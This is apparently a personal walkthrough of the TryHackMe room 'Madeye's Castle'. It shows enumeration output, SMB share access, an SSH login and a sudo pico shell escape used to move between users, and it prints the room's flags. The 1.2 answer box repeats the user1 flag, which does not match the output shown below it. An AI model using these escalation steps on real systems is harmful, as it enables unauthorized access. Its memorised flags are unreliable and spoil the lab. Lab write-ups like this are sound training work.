<h1 align="center">Madeye´s Castle<br><img width="1200px" src="ttps://github.com/user-attachments/assets/4a65adbb-2ce3-4c4b-a838-2ca5feb3a87d"></h1>
<p align="center">June 18, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>408</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>A boot2root box that is modified from a box used in CuCTF by the team at Runcode.ninja.</em><br>
Click <a href="https://tryhackme.com/room/madeyescastle">here </a>to access the "room".<br>
<img width="80px" src="https://github.com/user-attachments/assets/04450265-813a-469a-a168-a914f2932e65"><br></p>



<h2> Task 1 . Capture the Flags</h2>
<p>Have fun storming Madeye's Castle! In this room you will need to fully enumerate the system, gain a foothold, and then pivot around to a few different users. </p>

<h4 align="left"> Answer the questions below</h4>

> 1.1. <em>User1.txt</em> Hint : <em>Find the different user. Keep enumerating.</em><br><a id='1.1'></a>
>> <strong><code>RME{th3-b0Y-wHo-l1v3d-f409da6f55037fdc}</code></strong><br>
<p></p>

<h3>rustscan</h3>

```bash
:~# rustscan -a TargetIP --ulimit 5500 -- -sC -sV
...
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
...
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
| nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   <00>                 Flags: <unique><active>
|   <03>                 Flags: <unique><active>
|   <20>                 Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 31592/tcp): CLEAN (Timeout)
|   Check 2 (port 31306/tcp): CLEAN (Timeout)
|   Check 3 (port 38172/udp): CLEAN (Timeout)
|   Check 4 (port 47534/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-18T21:23:40
|_  start_date: N/A
...
```

<h3>dirsearch</h3>
<p><code>/backup/email</code></p>

```bash
:~# dirsearch -u http://TargetIP -r -x 401,402,403,404
...
```

![image](https://github.com/user-attachments/assets/f6c27ba0-159d-4b9e-80a0-ba21ecef3bd2)

<h3>http://TargetIP/backup/email</h3>

![image](https://github.com/user-attachments/assets/0a1a3275-9a81-4e3b-b182-a7583feb7e94)

<h3>usernames.txt</h3>

```bash
:~# cat usernames.txt
madeye
roar
echo
```

<h3>/etc/hosts</h3>

```bash
:~# echo "TargetIP hogwarts-castle.thm" | sudo tee -a /etc/hosts
```

<h3>smbclient</h3>

```bash
:~# smbclient -L hogwarts-castle.thm
Password for [WORKGROUP\root]:

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Harry's Important Files
	IPC$            IPC       IPC Service (ip-xx-xx-xxx-xxx server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

```bash
:~# smbclient //hogwarts-castle.thm/sambashare
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls

  .                                   D        0  Thu Nov 26 01:19:20 2020
  ..                                  D        0  Thu Nov 26 00:57:55 2020
  spellnames.txt                      N      874  Thu Nov 26 01:06:32 2020
  .notes.txt                          H      147  Thu Nov 26 01:19:19 2020

		9182548 blocks of size 1024. 2834312 blocks available
smb: \> mget *
Get file spellnames.txt? y
getting file \spellnames.txt of size 874 as spellnames.txt (213.4 KiloBytes/sec) (average 213.4 KiloBytes/sec)
Get file .notes.txt? y
getting file \.notes.txt of size 147 as .notes.txt (35.9 KiloBytes/sec) (average 124.6 KiloBytes/sec)
smb: \> exit
```

```bash
:~# cat spellnames.txt
avadakedavra
crucio
imperio
morsmordre
brackiumemendo
confringo
sectumsempra
sluguluseructo
furnunculus
...
```

```bash
:~# cat .notes.txt
Hagrid told me that spells names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.
...
```

<h3>http://hogwarts-castle.thm</h3>

![image](https://github.com/user-attachments/assets/b42e1275-8581-4cef-95a1-9d57e3d1c3cd)

<h3>enum4linux</h3>
<p>S-1-22-1-1001 Unix User\harry (Local User) and S-1-22-1-1002 Unix User\hermonine (Local User)</p>

```bash
:~# enum4linux -a TargetIP

 ===================================================== 
|    Enumerating Workgroup/Domain on TargetIP    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================= 
|    Nbtstat Information for TargetIP    |
 ============================================= 
Looking up status of TargetIP
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	                <00> -         B <ACTIVE> 
	                <03> -         B <ACTIVE> 
	                <20> -         B <ACTIVE> 
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ====================================== 
|    Session Check on TargetIP    |
 ====================================== 
[+] Server TargetIP allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for TargetIP4    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup
...
 ======================================================================== 
|    Users on TargetIP via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-1875690929-785468686-2729763687
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-1875690929-785468686-2729763687 and logon username '', password ''
...
S-1-5-21-1875690929-785468686-2729763687-501 IP-xx-xx-xxx-xxx\nobody (Local User)
...
S-1-5-21-1875690929-785468686-2729763687-513 IP-xx-xx-xxx-xxx\None (Domain Group)
...
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1001 Unix User\harry (Local User)
S-1-22-1-1002 Unix User\hermonine (Local User)
S-1-22-1-1003 Unix User\ubuntu (Local User)
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
...
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
...
```



```bash
....
```




```bash
root@ip-10-10-164-231:~# ssh harry@10.10.234.114
harry@10.10.234.114's password: 

 System information as of Thu 19 Jun 2025 12:13:23 AM UTC

  System load:  0.0               Processes:             112
  Usage of /:   64.2% of 8.76GB   Users logged in:       0
  Memory usage: 35%               IPv4 address for eth0: 10.10.234.114
  Swap usage:   0%
 _      __    __                     __         __ __                          __
 | | /| / /__ / /______  __ _  ___   / /____    / // /__  ___ __    _____ _____/ /____
 | |/ |/ / -_) / __/ _ \/  ' \/ -_) / __/ _ \  / _  / _ \/ _ `/ |/|/ / _ `/ __/ __/_ /
 |__/|__/\__/_/\__/\___/_/_/_/\__/  \__/\___/ /_//_/\___/\_, /|__,__/\_,_/_/  \__//__/
                                                        /___/

Last login: Thu Jun 19 00:03:37 2025 from 10.10.164.231
harry@ip-10-10-234-114:~$ id
uid=1001(harry) gid=1001(harry) groups=1001(harry)
harry@ip-10-10-234-114:~$ ls -lah
total 36K
drwxr-x--- 5 harry harry 4.0K Jun 18 23:58 .
drwxr-xr-x 5 root  root  4.0K Jun 18 23:29 ..
lrwxrwxrwx 1 root  root     9 Nov 26  2020 .bash_history -> /dev/null
-rw-r----- 1 harry harry  220 Apr  4  2018 .bash_logout
-rw-r----- 1 harry harry 3.7K Apr  4  2018 .bashrc
drwx------ 2 harry harry 4.0K Nov 26  2020 .cache
drwx------ 3 harry harry 4.0K Nov 26  2020 .gnupg
drwxrwxr-x 3 harry harry 4.0K Jun 18 23:58 .local
-rw-r----- 1 harry harry  807 Apr  4  2018 .profile
-rw-r----- 1 harry harry   40 Nov 26  2020 user1.txt
harry@ip-10-10-234-114:~$ cat user1.txt
RME{th3-b0Y-wHo-l1v3d-f409da6f55037fdc}
harry@ip-10-10-234-114:~$ 
```


![image](https://github.com/user-attachments/assets/4b1fbfa9-18cb-40d2-9b07-415c5a83ae04)

<br>

> 1.2. <em>User2.txt</em> Hint : <em>She is a know it all and wants you to share her love for the metric system.</em><br><a id='1.2'></a>
>> <strong><code>RME{th3-b0Y-wHo-l1v3d-f409da6f55037fdc}</code></strong><br>
<p></p>

```bash
harry@ip-10-10-234-114:~$ sudo -u hermonine pico
^R^X
reset; bash 1>&0 2>&0
```


```bash
hermonine@ip-10-10-234-114:~$ ls
user2.txt
hermonine@ip-10-10-234-114:~$ cat user2.txt
RME{p1c0-iZ-oLd-sk00l-nANo-64e977c63cb574e6}
```

```bash
hermonine@ip-10-10-234-114:~$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-xr-x 1 root root 8816 Nov 26  2020 /srv/time-turner/swagger
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 31032 Feb 21  2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 53040 Feb  6  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 85064 Feb  6  2024 /usr/bin/chfn
-rwsr-xr-x 1 root root 68208 Feb  6  2024 /usr/bin/passwd
-rwsr-xr-x 1 root root 88464 Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44784 Feb  6  2024 /usr/bin/newgrp
-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 159304 Jan 15 20:02 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 477672 Apr 11 12:16 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 39144 Apr  9  2024 /bin/umount
-rwsr-xr-x 1 root root 39144 Mar  7  2020 /bin/fusermount
-rwsr-xr-x 1 root root 67816 Apr  9  2024 /bin/su
-rwsr-xr-x 1 root root 55528 Apr  9  2024 /bin/mount
-rwsr-xr-x 1 root root 85064 Feb  6  2024 /snap/core20/2501/usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Feb  6  2024 /snap/core20/2501/usr/bin/chsh
-rwsr-xr-x 1 root root 88464 Feb  6  2024 /snap/core20/2501/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 Apr  9  2024 /snap/core20/2501/usr/bin/mount
-rwsr-xr-x 1 root root 44784 Feb  6  2024 /snap/core20/2501/usr/bin/newgrp
-rwsr-xr-x 1 root root 68208 Feb  6  2024 /snap/core20/2501/usr/bin/passwd
-rwsr-xr-x 1 root root 67816 Apr  9  2024 /snap/core20/2501/usr/bin/su
-rwsr-xr-x 1 root root 166056 Apr  4  2023 /snap/core20/2501/usr/bin/sudo
-rwsr-xr-x 1 root root 39144 Apr  9  2024 /snap/core20/2501/usr/bin/umount
-rwsr-xr-- 1 root systemd-resolve 51344 Oct 25  2022 /snap/core20/2501/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 477672 Jan  2  2024 /snap/core20/2501/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 180752 Jan 17 08:49 /snap/snapd/23771/usr/lib/snapd/snap-confine
hermonine@ip-10-10-234-114:~$ 
```

```bash
hermonine@ip-10-10-234-114:~$ /srv/time-turner/swagger
Guess my number: 22222
Nope, that is not what I was thinking
I was thinking of 1214357373
hermonine@ip-10-10-234-114:~$
```


> 1.3. <em>Root.txt</em><br><a id='1.3'></a>
>> <strong><code>_____________________</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/13068776-c9e5-48da-ba82-b123341ae60f)

![image](https://github.com/user-attachments/assets/4abfb4c4-0e6c-4a94-afc2-64c024837edd)

![image](https://github.com/user-attachments/assets/e175eaae-7f53-4985-86cd-f64473da481c)


